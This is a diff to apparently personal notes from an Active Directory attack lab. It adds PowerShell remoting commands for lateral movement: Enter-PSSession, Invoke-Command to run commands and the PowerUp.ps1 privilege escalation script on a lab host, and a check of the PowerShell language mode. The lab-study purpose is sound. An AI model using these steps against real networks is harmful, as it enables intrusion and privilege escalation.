@@ -29,5 +29,15 @@ Get a session on the machine on which you have local admin privleges:
 PS C:\AD\Tools> Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
 [dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Users\student536\Documents>
 
-lateral movement using powershell remoting:
+lateral movement using powershell remoting(one to one remoting):
 Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local #we had admin rights on this box
+
+One to Many remoting or Fan-out Remoting:
+Invoke-Command -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local -ScriptBlock{whoami;hostname} #For executing commands on multiple remote computers
+
+Invoke-Command -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local -FilePath C:\AD\Tools\PowerUp.ps1 #execute file on adminsrv machine
+
+To find out what language mode is powershell running on:
+$ExecutionContext.SessionState.LanguageMode #type in powershell (Constrained language mode or Full language mode)
+
+
